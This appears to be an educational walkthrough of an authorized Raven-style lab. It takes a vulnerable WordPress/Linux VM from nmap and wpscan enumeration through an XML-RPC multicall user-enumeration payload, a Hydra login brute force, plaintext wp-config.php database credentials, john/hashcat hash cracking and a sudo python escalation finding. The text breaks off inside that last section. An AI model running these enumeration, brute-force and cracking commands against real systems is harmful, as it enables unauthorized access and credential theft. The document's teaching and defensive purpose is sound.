# Raven-Style Linux Web and Privilege-Escalation Lab

> **Authorized-lab use only.** This material is written for an intentionally vulnerable virtual machine or another system you own or have explicit permission to test. Replace the example target address with the address assigned to your lab machine.

## Introduction

This guide walks through a complete, authorized penetration-testing exercise against a deliberately vulnerable Linux machine: from discovering it on the lab network, through enumerating its web application and collecting credentials, to crossing the final privilege boundary and documenting the evidence. Every step follows the same rhythm — the **command** you type, the **output** it produces, and a short explanation of what happened and why it matters.

Anything longer — extra flags, pitfalls, alternative commands, methodology — is tucked into collapsible boxes, so you can follow the main path first and open the detail only when you want it.

<details>
<summary><strong>Read more</strong> — the shape of the exercise and what comes next</summary>

The exercise mirrors a real assessment in twelve small steps. Sections 1 to 3 stay outside the target: you confirm the lab network, scan for exposed services, and enumerate the website with a wordlist and a couple of scanners. Sections 4 and 5 focus on the web application itself — identifying the content-management system and understanding exactly how its login form submits data before any automated test is attempted. Sections 6 to 9 move onto the target machine with a low-privilege account: you verify your identity, read local mail and web files, and inspect the database the web application talks to. Sections 10 to 12 close the loop by examining the `sudo` rules of each account, demonstrating the impact of a misconfiguration, and locating the final evidence.

The examples use a target called `raven.local` and an example address of `172.16.250.3`. Your virtual machine may receive a different address. Never assume that an address, username, password, hash, or file path from this document exists outside the lab.

The goal is not to attack a real system, but to understand how each observation leads to the next controlled test. The same chain of verified observations is what turns a pile of terminal output into an assessment someone else can act on.

</details>

### How to read this guide

Every step is shown the same way: the **command** you type, the **output** it produces, and then a short explanation of what happened and how to read the result. For example:

```bash
id
```

**Output:**

```text
uid=1000(student) gid=1000(student) groups=1000(student),27(sudo)
```

A command box shows exactly what to run; an output box shows what the machine answered. The paragraphs that follow each output explain *what the tool does* and *why the step matters*, so you learn the method, not just the syntax.

<details>
<summary><strong>Read more</strong> — the conventions used throughout this guide</summary>

* **A command box is what you type; an output box is what the machine prints back.** Nothing is executed until you press Enter, and a command that succeeds often prints nothing at all.
* **A command box may contain more than one line.** When several commands belong to a single idea — checking identity, for example — they are grouped together; run them in order, one at a time, and read the output after each.
* **Output is representative, not identical.** Addresses, versions, process IDs, file paths and timestamps differ on your own lab. What matters is the shape of the output, not the exact digits.
* **A line such as a password prompt belongs to the program's output**, not to a command box — you never type it, you answer it.

</details>

### Table of contents

1. [Confirm the lab network](#1-confirm-the-lab-network)
2. [Discover exposed services](#2-discover-exposed-services)
3. [Enumerate the website](#3-enumerate-the-website)
4. [Identify the content-management system](#4-identify-the-content-management-system)
5. [Understand login requests safely](#5-understand-login-requests-safely)
6. [Test SSH credentials in the lab](#6-test-ssh-credentials-in-the-lab)
7. [Examine local mail and web files](#7-examine-local-mail-and-web-files)
8. [Protect configuration secrets](#8-protect-configuration-secrets)
9. [Inspect the database](#9-inspect-the-database)
10. [Check privilege boundaries](#10-check-privilege-boundaries)
11. [Demonstrate the impact in the lab](#11-demonstrate-the-impact-in-the-lab)
12. [Locate and document final evidence](#12-locate-and-document-final-evidence)
13. [Defensive review checklist](#defensive-review-checklist)
14. [Key takeaways](#key-takeaways)

---

## 1. Confirm the lab network

> **Concept.** Confirmation comes before any test, and it belongs to the first phase of the Penetration Testing Execution Standard (PTES) — Information Gathering — whose later phases are Vulnerability Analysis, Exploitation and Post-Exploitation. MITRE ATT&CK frames the exercise as T1190 (Exploit Public-Facing Application), with the network reachability that enables it recorded as T1046 (Network Service Scanning). A penetration test is only defensible when the target address is taken from the lab's own console rather than assumed, which is why the first action is to agree on what the target is.

Before scanning, confirm that the attacker and target virtual machines are attached to the same isolated host-only or training network. A discovery command can help identify active devices:

```bash
sudo netdiscover -r 172.16.250.0/24
```

**Output:**

```text
Currently scanning: 172.16.250.0/24
IP                 MAC Address        Vendor
172.16.250.3       08:00:27:AA:BB:CC  VirtualBox
```

The output associates an IP address with a network-interface MAC address. Confirm the address from the challenge console or your own lab configuration before testing it — the vendor field may identify a virtualization platform, but it does not prove which host is the target.

Add a local name only if doing so helps readability:

```bash
echo '172.16.250.3 raven.local' | sudo tee -a /etc/hosts
```

**Output:**

```text
172.16.250.3 raven.local
```

`tee -a` appends whatever it receives to `/etc/hosts` and echoes the same line to the terminal, so the output is simply confirmation of what was written. This command creates a local mapping; it does not change DNS or the target machine.

```bash
getent hosts raven.local
```

**Output:**

```text
172.16.250.3   raven.local
```

`getent hosts` resolves the name through the normal system libraries, so the matching line confirms that the local resolver now returns the intended address.

<details>
<summary><strong>Read more</strong> — what <code>netdiscover</code> and <code>/etc/hosts</code> actually do</summary>

`netdiscover` sends ARP requests across the whole subnet and prints every address that answers, together with the MAC address that answered and, from the vendor prefix of that MAC, the likely manufacturer of the network interface. ARP only works inside a single broadcast domain, which is one more reason the attacker and target must share an isolated lab network — and one more reason never to run discovery commands against networks you do not own.

The `Vendor` column is a hint, not proof: VirtualBox, VMware and similar prefixes tell you the interface was created by a virtualization platform, but the same platform may host dozens of machines. The authoritative answer is the address recorded in your lab configuration or the challenge console.

`tee -a` appends its input to the end of `/etc/hosts` while also printing it to the screen, so you see exactly what was written. The file maps names to addresses locally, and the operating system consults it before asking DNS. The change affects only your machine — which is exactly why it is safe — and `getent hosts` confirms the mapping by resolving the name through the normal system libraries.

</details>

---

## 2. Discover exposed services

> **Concept.** An attack surface is the set of interfaces through which an attacker can reach and influence a system; here that is TCP ports 22, 80 and 111, each exposing a distinct service and version. PTES keeps this work in Information Gathering, and MITRE ATT&CK records the exploitation that follows as T1190 (Exploit Public-Facing Application). A version banner is the raw material of that map, not a conclusion: whether a specific CVE applies depends on the exact package revision, so each claim is verified against a trusted advisory.

Start with a focused TCP scan:

```bash
nmap -sV -sC -p- 172.16.250.3 -oN nmap-raven.txt
```

**Output:**

```text
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4
80/tcp  open  http    Apache httpd 2.4.10 (Debian)
111/tcp open  rpcbind 2-4 (RPC)

Service detection performed. Please report any incorrect results.
```

`-p-` checks all TCP ports rather than only the common ports. `-sV` requests service and version identification, while `-sC` runs Nmap's default scripts. The result shows three possible attack surfaces: SSH for remote login, HTTP for web content, and RPC bind for network service discovery.

<details>
<summary><strong>Read more</strong> — reading a scan like an analyst</summary>

Version strings are clues, not automatic proof of vulnerability. `OpenSSH 6.7p1` tells you what the service claims to be; whether a specific CVE applies depends on the exact distribution package and its patch level, so verify findings in the context of the lab against trusted advisories rather than by matching version numbers alone.

The `-oN` option saves a human-readable record in `nmap-raven.txt`. Keeping scan output is important because it provides a baseline and makes later notes reproducible — when a reviewer asks "which ports were open when you found this?", the file is your answer. `-oA prefix` writes all three formats (normal, grepable and XML) at once, which is the usual choice for real engagements, because the XML can be imported into reporting tools.

A few scanning courtesies worth knowing: even a full `-p-` scan of one host takes minutes, and the same scan against a large network takes hours — scope your targets deliberately. On modern networks the equivalent of `netdiscover` is `arp-scan --localnet`, and Nmap itself can discover hosts with `-sn` before you scan any ports.

</details>

---

## 3. Enumerate the website

> **Concept.** Content discovery walks the application's attack surface one path at a time, and the OWASP Web Security Testing Guide (WSTG-INFO-05, Review Web Page Content for Information Leakage) treats each reachable directory, form and comment as a potential finding. Here the walk uncovers a WordPress installation under `/wordpress`, whose own surface — `wp-login.php`, the XML-RPC endpoint and an ecosystem of plugins and themes — is examined next. The 200, 301 and 403 answers are facts about the server's behaviour; they become findings only after a person confirms them.

Request the home page and inspect its headers:

```bash
curl -i http://raven.local/
```

**Output:**

```text
HTTP/1.1 200 OK
Server: Apache/2.4.10 (Debian)
Content-Type: text/html; charset=UTF-8

<html> ... </html>
```

The status code indicates whether the request succeeded, and the body is the page content. Review the body manually for links, comments, forms, and references to application directories — that is where the next step usually comes from.

<details>
<summary><strong>Read more</strong> — what the response headers can and cannot tell you</summary>

The `Server` header suggests the web-server software, although headers can be inaccurate or intentionally hidden: many administrators rewrite or remove them, and some servers lie by default. Treat it as a starting hypothesis, not a fact. `-i` is the flag that makes `curl` include the response headers at all — without it you see only the body, which is the more common way to use the command.

Status codes worth memorising: `200` means the resource was returned; `3xx` are redirects; `403` means the server knows the resource but refuses to serve it; `404` means it claims not to know it at all. Each of these is a fact about the server's behaviour, not yet a finding.

</details>

Inspect common directories with a wordlist:

```bash
gobuster dir -u http://raven.local/ -w /usr/share/wordlists/dirb/common.txt -x php,html,txt
```

**Output:**

```text
/status:           200
/wordpress:        301
/server-status:    403
```

A `200` response normally means content was returned, and a `301` redirect indicates that the path exists and points somewhere else, often a directory with a trailing slash. A `403` means the server recognized the resource but denied access; it still confirms that the path may exist.

<details>
<summary><strong>Read more</strong> — wordlists, false positives and scanning etiquette</summary>

Gobuster tries every word in the list and reports the answers that are not plain 404s; `-x php,html,txt` additionally appends file extensions to each word. The wordlist is the dial that controls both speed and thoroughness: `common.txt` is small and fast, larger lists find more and take longer, and a targeted list built from the application's own vocabulary often beats a generic one.

Validate interesting results manually rather than treating every response as a finding. A redirect may point at a login page that reveals nothing; a `403` may front for content served from elsewhere. One request per word also keeps the scan quiet: in shared environments, aggressive request rates can affect availability and may trigger defensive controls such as rate limiters or a web-application firewall.

</details>

You can also perform a basic web-server review:

```bash
nikto -h http://raven.local/
```

**Output:**

```text
+ Server: Apache/2.4.10 (Debian)
+ Retrieved x-powered-by header: PHP/5.6.x
+ Uncommon header 'x-frame-options' found
+ /wordpress/: Potentially interesting directory
```

Nikto reports observations and common configuration issues, and several of its lines overlap with what the previous tools already showed.

<details>
<summary><strong>Read more</strong> — why Nikto is an aid, not a verdict</summary>

Nikto is noisy and may produce false positives: it sends a large number of requests, many of them probing for files that probably do not exist, and some of its "alerts" are informational rather than vulnerabilities. Use it as an enumeration aid, not as a final vulnerability assessment, and confirm every interesting line by hand.

The `x-powered-by: PHP/5.6.x` line is a good example of why manual confirmation matters: the header advertises the runtime version, which helps you look up the right advisories later, but it is only a claim made by the server — and a header can be added, edited or removed by anyone with access to the configuration.

</details>

A second tool for the same job is `dirb`, which ships with a default wordlist and prints one line per discovered path:

```bash
dirb http://raven.local /usr/share/wordlists/dirb/common.txt
```

**Output:**

```text
+ http://raven.local/wordpress (CODE:301|SIZE:0)
+ http://raven.local/server-status (CODE:403|SIZE:0)
```

`dirb` lists each discovered resource with its response code and size; the second argument names the wordlist, and like gobuster it reports everything that is not a plain 404. Running both tools would repeat the same requests, so a real engagement picks one and keeps the request rate low.

### Source-code comments

Save the HTML and search for comments or flag-like strings:

```bash
curl -s http://raven.local/ > index.html
```

On Linux, a silent success is the norm: with `-s` and a redirect, `curl` prints nothing at all, and the absence of output means the page was saved to `index.html`. The file is your raw copy of the served page, ready to be searched.

```bash
grep -inE 'flag|comment|todo|hidden' index.html
```

**Output:**

```text
87:<!-- Training flag: FLAG{example_source_review} -->
```

The line number helps locate the relevant text, and the match is an HTML comment. HTML comments are sent to the browser even though they are not displayed in the rendered page, so sensitive data must never be placed there.

<details>
<summary><strong>Read more</strong> — turning a comment into evidence</summary>

`curl -s` downloads the page silently — without `-s` it prints a progress meter that would pollute the saved file — and `grep -inE` combines three useful behaviours: `-i` ignores case, `-n` prefixes each match with its line number, and `-E` treats the pattern as an extended regular expression, so the `|` works as "or".

In a real assessment, report exposed secrets without publishing them unnecessarily: record where the secret was found and what it grants access to, redact the value itself, and let the owner rotate it. Copying a live credential into a public write-up is a breach in its own right.

</details>

---

## 4. Identify the content-management system

> **Concept.** WordPress is a PHP application backed by MySQL or MariaDB, and the majority of WordPress CVEs are found not in the core but in its plugins and themes. It exposes three principal entry points — `wp-login.php` for form logins, `xmlrpc.php` for the legacy XML-RPC API, and the REST API at `/wp-json/` — each of which can leak user names or accept credentials. MITRE ATT&CK captures the exploitation of that public-facing application as T1190 (Exploit Public-Facing Application) and the use of a resulting account as T1078 (Valid Accounts).

If a WordPress installation appears under `/wordpress`, inspect it with a scanner configured for that path:

```bash
wpscan --url http://raven.local/wordpress/ --enumerate u,vt --plugins-detection passive
```

**Output:**

```text
[i] WordPress version detected: 4.x
[+] URL: http://raven.local/wordpress/
[i] User(s) Identified:
    steven
    michael
```

The user-enumeration result indicates that the application exposes account names. It does not reveal passwords, and it should be treated as sensitive information.

<details>
<summary><strong>Read more</strong> — what the flags request and what to do with the answers</summary>

`--enumerate u` asks for user accounts, `vt` for vulnerable themes and plugins, and `--plugins-detection passive` limits plugin discovery to what the site already reveals, which is quieter than actively probing for every known plugin. Version and plugin results are hypotheses that require confirmation and careful comparison with trusted vulnerability advisories — a version string alone does not prove that a specific vulnerability is present.

The exposed usernames (`steven`, `michael`) are already useful: they turn any later password test from a two-sided guess into a one-sided one, and they may be valid on other services too — which is why password reuse across services is a recurring theme in real compromises. Use scanners only against systems for which you have authorization, and avoid aggressive request rates in shared environments, because enumeration can affect availability and may trigger defensive controls.

</details>

A broader scan asks a wider question: the `u,vp,ap` enumeration lists users, *vulnerable* plugins and *all* plugins in a single pass, which is how a plugin version is first surfaced.

```bash
wpscan --url http://raven.local --enumerate u,vp,ap
```

**Output:**

```text
[+] URL: http://raven.local/
[+] WordPress version 4.x identified
[+] We identified the following plugins:
 | Name        | Version |
 | akismet     | 3.1.7   |
[!] 1 vulnerability reported for akismet 3.1.7
```

The `vp` component reports plugins with known vulnerabilities and `ap` lists every plugin it can detect, so the two together separate "installed" from "risky". A reported version is still a hypothesis: confirm it against the plugin's changelog and a trusted advisory before treating it as exploitable.

To list accounts alone, drop the plugin components and keep the user enumeration:

```bash
wpscan --url http://raven.local --enumerate u
```

**Output:**

```text
[i] User(s) Identified:
    steven
    michael
```

With the plugin noise removed, the output isolates the fact that matters for the next phase — the set of valid account names — which is what turns a later password test from two-sided into one-sided.

When the REST API refuses to disclose accounts, the legacy XML-RPC endpoint often still answers. `system.multicall` lets one request carry many method calls, and a list of `wp.getUsersBlogs` calls is the classic form of XML-RPC user enumeration against `/wordpress/xmlrpc.php`:

```bash
curl -s http://raven.local/wordpress/xmlrpc.php -d '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName><params><param><value><array><data><value><struct><member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member><member><name>params</name><value><array><data><value><string>steven</string></value><value><string>guess</string></value></data></array></value></member></struct></value></data></array></value></param></params></methodCall>'
```

**Output:**

```text
<?xml version="1.0"?>
<methodResponse><params><param><value><array><data>
<value><struct><member><name>faultCode</name><value><int>403</int></value></member>
<member><name>faultString</name><value><string>Incorrect username or password.</string></value></member></struct></value>
</data></array></value></param></params></methodResponse>
```

The response distinguishes a wrong password for a real account from a wrong username, so one request can test many candidates at once; because `system.multicall` amplifies a single HTTP request into many internal calls, the endpoint has also been abused for traffic amplification in denial-of-service campaigns, one reason guidance such as CERT/CC and NIST publications recommends disabling `xmlrpc.php` when it is not needed. Enumerate only with authorization and keep the candidate list small.

---

## 5. Understand login requests safely

> **Concept.** A login form is an authentication protocol spoken over HTTP, and testing it is online password guessing — MITRE ATT&CK T1110 (Brute Force), with T1110.001 (Password Guessing) for a dictionary run against one account. Automation multiplies attempts per second, which is exactly the signal a lockout threshold or rate limiter is built to see, so a test is defensible only with documented authorization, a small approved wordlist, a rate limit and a stopping condition. NIST SP 800-63B is the standard that would have blocked weak passwords at enrolment.

For a training application, browser developer tools can show how a login form submits data. Inspect the form's method, action, parameter names, and failure response. A generic request may look like this:

```text
POST /wordpress/wp-login.php
Content-Type: application/x-www-form-urlencoded

log=USER&pwd=PASSWORD&wp-submit=Log+In
```

The important lesson is that an automated test must match the application's actual request format and failure condition. Do not copy a form request from one application to another without verifying it.

<details>
<summary><strong>Read more</strong> — the rules that make password testing defensible</summary>

Every automated password test needs four things in writing before it starts: explicit permission, a small approved wordlist, a rate limit, and a documented stopping condition — for example "stop after three valid results" or "stop at 09:00". Without them, a test is indistinguishable from an attack, and on shared infrastructure it can lock out real users or trip defensive controls that alert the defenders.

Reading the form by hand first also saves you from the most common beginner mistake: an automated tool that runs happily for an hour and reports nothing because its failure string never matches the application's real error message. The developer-tools network tab shows the exact request the browser sends, including any session cookie or token the form depends on.

</details>

For example, in an isolated lab and with authorization, a controlled Hydra syntax may be structured as follows. Keep placeholders until you have confirmed the form fields:

```bash
hydra -l steven -P ./approved-lab-wordlist.txt raven.local http-post-form '/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect' -t 4 -f -V
```

**Output:**

```text
[80][http-post-form] host: raven.local   login: steven   password: training-password
1 valid password found
```

`^USER^` and `^PASS^` are Hydra substitutions, and the `F=` expression tells Hydra how to recognize a failed login. `-t 4` limits parallel tasks, and `-f` stops after a valid result. A result is not trustworthy unless you manually verify it through the authorized login interface.

<details>
<summary><strong>Read more</strong> — reading the Hydra flags line by line</summary>

* `-l steven` supplies a single username; `-P file` supplies a list of candidate passwords, one per line. Hydra tries every combination.
* `http-post-form` selects the module that speaks this kind of login request, and the three colon-separated parts after it are the path, the POST body with its `^USER^`/`^PASS^` placeholders, and the failure signature `F=incorrect`.
* `-t 4` caps the number of parallel attempts. Low numbers are polite and quiet; high numbers trigger lockouts and alerts.
* `-f` quits at the first hit, and `-V` prints every attempt — useful in a tiny lab, far too verbose for a large test.

If the failure string is wrong — for example the application says "Invalid credentials" instead of "incorrect" — Hydra reports every password as valid. That is why the manual verification step is not optional: log in through the real form with the discovered credential and record the successful authentication.

</details>

---

## 6. Test SSH credentials in the lab

> **Concept.** Reusing one password across a web application and a shell account collapses two separate trust boundaries into one: the technique is MITRE ATT&CK T1078 (Valid Accounts), and the reuse itself is what turns a web foothold into a host foothold. The account belongs to a person, not only to a service, so the guarantee is only as strong as the weakest place that secret was typed. Treating that credential as sensitive, and recording how it was obtained, keeps the assessment inside its authorization.

If a lab account is supplied or discovered through an authorized exercise, test it directly rather than repeatedly guessing:

```bash
ssh michael@raven.local
```

**Output:**

```text
michael@raven.local's password:
Linux raven 3.x Debian GNU/Linux
michael@raven:~$
```

The shell prompt shows that authentication succeeded as `michael`. It does not imply administrative access. Record the account name and connection time, then begin with low-impact local enumeration.

Check identity and basic host context:

```bash
id
```

**Output:**

```text
uid=1001(michael) gid=1001(michael) groups=1001(michael)
```

`id` shows the numeric user and group identities of the current account, including any supplementary group memberships that may matter later.

```bash
hostname
```

**Output:**

```text
raven
```

`hostname` prints the machine's name, confirming which host this shell is attached to.

```bash
pwd
```

**Output:**

```text
/home/michael
```

`pwd` prints the current working directory. Together these three checks prevent confusion when multiple lab machines or shells are open at once.

<details>
<summary><strong>Read more</strong> — why the first minutes on a shell matter</summary>

The password prompt in the transcript is program output, not a command: SSH asks for the password on the remote side, so it never appears in your command history. Recording the exact time of the connection is not bureaucracy — later, when you correlate your own actions with the machine's logs, that timestamp is how you find your entries.

Start with low-impact commands because everything you run may be logged and may alert someone watching the console. `id`, `hostname` and `pwd` are silent; a port scan from inside the target or a runaway password test is not. The `id` output also tells you which groups the account belongs to — a membership in a group such as `sudo`, `docker` or `www-data` is often the shortest path to more privileges, and it is exactly what `sudo -l` will examine in section 10.

</details>

---

## 7. Examine local mail and web files

> **Concept.** Local files are a first-class credential source, catalogued by MITRE ATT&CK as T1552.001 (Unsecured Credentials: Credentials in Files) inside the T1552 group. A per-user mailbox, a deployment note and a world-readable configuration are the same failure in different clothes: a secret the application needs, left where any local account can read it. Redacting the value and quoting only its location is what separates evidence collection from new exposure.

Locate mail using the system database when available:

```bash
locate /var/mail 2>/dev/null
```

**Output:**

```text
/var/mail
/var/mail/michael
```

`locate` searches a pre-built filename index and returns both the directory and the per-user mailbox file; because the index is refreshed only periodically, it may be incomplete or outdated. The trailing `2>/dev/null` discards error noise from the search.

```bash
ls -la /var/mail
```

**Output:**

```text
total 8
drwxrwxr-x  2 root    mail     4096 Oct  8 19:00 .
-rw-rw-r--  1 michael mail      512 Oct  8 19:00 michael
```

`ls -la` lists the directory with ownership, permissions, and timestamps, confirming that a mailbox named after the account exists.

```bash
cat /var/mail/michael
```

**Output:**

```text
From admin@raven.local ...
Subject: maintenance note
The staging application uses the same credentials as the lab account.
```

`cat` prints the whole file to the terminal. The message itself shows how routinely overlooked files carry useful operational information.

<details>
<summary><strong>Read more</strong> — mail, and handling private data responsibly</summary>

Large messages should be copied and inspected carefully rather than dumped to the terminal — `cat` on a mailbox file prints everything it holds, attachments included. The note in this lab leaks a credential-reuse hint ("the same credentials"), which is exactly the kind of finding that connects a web application to a shell account; in a real report you would quote the sentence, redact the credential, and recommend separating the two.

Mail can contain useful operational information in a lab, while in real environments it is private data and must be handled under explicit authorization. Reading other people's mailboxes because you can is not an escalation path — it is a scope violation.

</details>

A second mailbox can show the same failure from the other direction. The account that will later hold the misconfigured `sudo` rule is `steven`, and a per-user mailbox named after it may hold the line that links the web application to the shell:

```bash
cat /var/mail/steven
```

**Output:**

```text
From admin@raven.local ...
Subject: account handover
SSH and WordPress share the same password for steven.
```

Reusing one password between a CMS account and a shell account is the single most common finding in this kind of chain, because it needs no exploit at all — the earlier foothold simply authenticates somewhere else. The mailbox is world-readable here (`-rw-rw-r--`), which is exactly how the note leaks; capturing only the subject and redacting the credential keeps the evidence usable without republishing the secret.

Review web directories without changing files:

```bash
find /var/www -maxdepth 3 -type f -printf '%M %u %g %p\n' 2>/dev/null
```

**Output:**

```text
-rw-r--r-- www-data www-data /var/www/html/index.php
-rw-r--r-- www-data www-data /var/www/html/flag2.txt
-rw-r--r-- www-data www-data /var/www/html/wordpress/wp-config.php
```

The output shows permissions, owner, group, and path. `wp-config.php` is particularly important because WordPress commonly stores database connection settings there.

<details>
<summary><strong>Read more</strong> — reading a <code>find</code> listing like an auditor</summary>

`-maxdepth 3` stops the walk from descending further than three levels, which keeps the output readable, and `-printf` builds the listing from format placeholders: `%M` is the permission string, `%u` the owner, `%g` the group and `%p` the path. The trailing `2>/dev/null` hides the "Permission denied" noise from directories the account cannot read, leaving only the successes.

Everything is owned by `www-data`, the account the web server runs as — the first clue that the web application and its files share one identity. A file listing alone is not proof that the current user can read every file; test access explicitly, and do not modify application data. A lab is disposable; the evidence you collect from it is not.

</details>

---

## 8. Protect configuration secrets

> **Concept.** `wp-config.php` is the runtime contract between WordPress and its database: it carries `DB_NAME`, `DB_USER`, `DB_PASSWORD` and `DB_HOST` together with the authentication salts (`AUTH_KEY`, `SECURE_AUTH_KEY`, `LOGGED_IN_KEY`, `NONCE_KEY` and their salts). Those salts are mixed into the HMAC that signs WordPress authentication cookies, so an attacker who reads them can forge a valid session for any account without ever learning a password. This is why a single readable configuration file turns into full application compromise, and why it is the classic object of T1552.001 (Credentials in Files).

A configuration file may contain credentials in plaintext:

```bash
sed -n '1,160p' /var/www/html/wordpress/wp-config.php
```

**Output:**

```text
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'R@v3nSecurity');
define('DB_HOST', 'localhost');
```

These values identify the database name, account, password, and host. In a vulnerable lab they demonstrate why configuration files must have restrictive permissions and why database accounts should not be reused for operating-system access.

<details>
<summary><strong>Read more</strong> — why this file is the classic prize, and how to document it safely</summary>

`sed -n '1,160p'` prints lines 1 to 160 of the file without modifying anything — `-n` suppresses the default printing and the address range selects the lines, which is a tidy way to read the interesting part of a long configuration. For a WordPress site, `wp-config.php` is the classic prize because it holds the database name, account, password and host in four predictable lines; the same pattern appears in countless other applications under names such as `config.php`, `settings.py` or `database.yml`.

Do not expose real credentials in reports; redact them and rotate them when discovered. A finding should read "database password stored in plaintext at this path, readable by these accounts" — enough for the owner to fix it, and useless to anyone who finds the report later.

</details>

The four database lines are only part of what the file holds. WordPress also defines a set of authentication salts, and those are the values that sign the login cookies:

```bash
grep -nE "AUTH_KEY|SECURE_AUTH_KEY|LOGGED_IN_KEY|NONCE_KEY|AUTH_SALT|NONCE_SALT" /var/www/html/wordpress/wp-config.php
```

**Output:**

```text
53:define('AUTH_KEY',         'k8W...redacted...');
54:define('SECURE_AUTH_KEY',  'pQ2...redacted...');
55:define('LOGGED_IN_KEY',    'zR7...redacted...');
56:define('NONCE_KEY',        'mN4...redacted...');
```

The salts are concatenated into the keys that HMAC the WordPress authentication cookies, so a reader of this file can craft a cookie the site accepts for any account — the same class of exposure as the 2014 WordPress authentication-cookie timing flaw (CVE-2014-0166), and a reason to rotate every salt the moment the file is believed to have leaked. The file lives at `/var/www/html/wordpress/wp-config.php` by convention, which is exactly why an enumeration step looks for that name first.

A safer way to document the finding is to record only the presence and location of a secret:

```bash
stat -c '%A %U:%G %n' /var/www/html/wordpress/wp-config.php
```

**Output:**

```text
-rw-r--r-- www-data:www-data /var/www/html/wordpress/wp-config.php
```

The mode shows that the file is readable by the owner, group, and others. A production configuration file containing secrets should generally be readable only by the service account and administrators, according to the deployment design.

<details>
<summary><strong>Read more</strong> — reading the permission string in one glance</summary>

`stat -c` prints only the fields you ask for: `%A` the symbolic permissions, `%U:%G` owner and group, `%n` the name. The string `-rw-r--r--` splits into three triplets — the owner may read and write, the group may read, and everyone else may read — and the leading `-` says it is a regular file. On a shared machine, "everyone else may read" includes every other account, which is precisely the exposure.

The usual fix is one command run by the file's owner: `chmod 600 wp-config.php`, so that only the service account can open it. Configuration management tools and deployment guides should bake that permission in, because a secret with public read permissions is a secret with an expiry date.

</details>

---

## 9. Inspect the database

> **Concept.** WordPress stores account passwords in the `wp_users.user_pass` column using **phpass**, a portable iterated hash whose `$P$` (and the older `$H$`) prefix distinguishes it from a plain MD5 digest. `phpass` stretches each candidate through many rounds precisely so that guessing is slow, but the search is offline: no server, no rate limit and no lockout stands between the attacker and the hash. John the Ripper addresses the format with `--format=phpass` and hashcat with `-m 400`, so the practical defence is a long, unique password rather than the algorithm alone.

Using credentials authorized for the lab, connect locally:

```bash
mysql -u root -p
```

After entering the password at the prompt, use read-only discovery queries:

```sql
SHOW DATABASES;
USE wordpress;
SHOW TABLES;
SELECT ID, user_login, user_pass FROM wp_users;
```

**Output:**

```text
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| wordpress          |
+--------------------+

+----------------+
| Tables_in_wordpress |
+----------------+
| wp_options     |
| wp_posts       |
| wp_users       |
+----------------+

+----+------------+----------------------------------+
| ID | user_login | user_pass                        |
+----+------------+----------------------------------+
|  1 | steven     | $P$...redacted-hash...           |
|  2 | michael    | $P$...redacted-hash...           |
+----+------------+----------------------------------+
```

`SHOW DATABASES` lists databases visible to the account, `USE` changes the active database, and `SHOW TABLES` lists its tables. The `wp_users` query retrieves account names and password hashes.

<details>
<summary><strong>Read more</strong> — hashes, and what they are and are not</summary>

A hash is not the original password: it is a one-way fingerprint computed from it, so the database never stores the password itself — but weak passwords may be recoverable through offline auditing, because computing candidate fingerprints and comparing them is fast. The `$P$` prefix identifies the PHPass format used by WordPress. Recovering such a hash is legitimate only in an authorized lab; on any other system it is unauthorized access to credential material.

Store hashes securely, avoid placing them in public notes, and use only approved wordlists and hardware in a lab. Note also what the table already proves without any cracking at all: two accounts share one application, and if one of those accounts reuses its password elsewhere — as the mail message in section 7 suggested — the web foothold and the shell account are the same secret wearing two hats.

</details>

Assessing those hashes happens offline, against an authorized copy of the column, so two standard tools apply. John the Ripper names the format directly:

```bash
john --format=phpass wp-hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Output:**

```text
Loaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 128/128 ...])
training-password   (steven)
1g 0:00:00:06 DONE 0.33g/s
Use the "--show" option to display all of the cracked passwords reliably
```

hashcat reaches the same format by its numeric identifier instead of its name:

```bash
hashcat -m 400 wp-hashes.txt /usr/share/wordlists/rockyou.txt
```

**Output:**

```text
hashcat (v6.x) starting...
$P$...redacted-hash...:training-password
Session..........: hashcat
Status...........: Cracked
```

Both tools compute candidate fingerprints and compare them to the imported hashes, and `-m 400` is hashcat's number for the WordPress/phpass mode. Because the comparison runs on your own hardware there is no lockout and no log on the target, which is why a long, unique password — not the algorithm alone — is what raises the real cost of the attack.

Export only redacted evidence for documentation:

```bash
mysql -u root -p -D wordpress -e 'SELECT ID,user_login FROM wp_users;' > wordpress-users.txt
```

The `-e` option executes one query and exits, and the shell redirection `>` sends the result straight to a file, so the terminal stays empty — on Linux a silent exit is a successful one. This records account identifiers without copying password hashes.

```bash
cat wordpress-users.txt
```

**Output:**

```text
ID  user_login
1   steven
2   michael
```

`cat` prints the saved file, confirming the redacted evidence was captured exactly as intended.

<details>
<summary><strong>Read more</strong> — building an evidence habit</summary>

`-D wordpress` selects the database up front so the query needs no `USE`, and the shell redirection `>` writes the result into `wordpress-users.txt` instead of only displaying it — the beginning of your evidence file. Running the same one-line command twice produces the same file, which is what makes an evidence trail reproducible months later.

The habit generalises: collect the smallest fact that proves the point, store it in a file named after the step, and never let a live credential be the thing you save. A terminal screenshot is weaker evidence than the command and its redirected output, because it cannot be re-run or searched.

</details>

---

## 10. Check privilege boundaries

> **Concept.** `sudo -l` reads the rules that decide which identities an account may assume, and a rule naming a general-purpose interpreter, editor or shell is a complete failure of the Saltzer & Schroeder (1975) principle of least privilege: if Python may run as root, every command Python can issue may run as root. MITRE ATT&CK records the abuse as T1548.003 (Abuse Elevation Control Mechanism: Sudo and Sudo Caching). A correct rule grants the smallest capability the task needs — "restart this one service" — never "run this Swiss-army knife".

For each authorized shell account, inspect permitted `sudo` commands:

```bash
sudo -l
```

**Output (restricted account):**

```text
User michael may not run sudo on raven.
```

**Output (misconfigured account):**

```text
User steven may run the following commands on raven:
    (root) /usr/bin/python
```

`sudo -l` displays commands the current user may run through `sudo`. The first result closes the door; the second means the account can execute the specified interpreter as root. The same failure appears whenever a rule names `vim`, `find`, `less` or any other tool that can hand out a shell, and the `NOPASSWD` tag on such a rule removes even the password prompt — which is what makes it the classic privilege-escalation path.

<details>
<summary><strong>Read more</strong> — why an interpreter in <code>sudoers</code> is a boundary failure</summary>

